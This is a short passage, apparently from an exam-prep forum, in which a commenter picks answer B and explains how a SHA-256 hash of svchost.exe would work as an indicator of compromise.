year, 1 month ago\nSelected Answer: B\nThis is because the SHA-256 hash is a unique identifier for a specific file. If the indicator contains the hash of svchost.exe, it would help identify any\nmalicious files with the same hash that have been altered or injected with malware. However, svchost.exe is a legitimate Microsoft binary, and unless\nmodified with malicious intent, it wouldn’t trigger alerts on its own.\nupvoted 1 times"}], "answ
